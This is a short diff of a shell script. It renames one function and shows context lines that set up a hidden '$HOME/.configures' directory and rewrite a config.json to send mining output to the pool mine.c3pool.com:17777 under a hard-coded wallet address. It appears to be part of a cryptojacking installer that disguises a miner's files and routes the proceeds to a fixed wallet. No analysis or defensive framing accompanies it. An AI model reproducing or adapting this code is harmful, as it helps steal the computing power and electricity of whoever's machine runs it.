@@ -110,7 +110,7 @@ if [ -d "$HOME/.configures" ]
         mkdir -p $HOME/.configures
 fi
 
-func WalletConfigSet() {
+function WalletConfigSet() {
     sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:17777",/' $HOME/.configures/config.json
     sed -i 's/"user": *"[^"]*",/"user": "84hYzyMkfn8RAb5yMq7v7QfcZ3zgBhsGxYjMKcZU8E43ZDDwDAdKY5t84TMZqfPVW84Dq58AhP3AbUNoxznhvxEaV23f57T",/' $HOME/.configures/config.json
     sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.configures/config.json
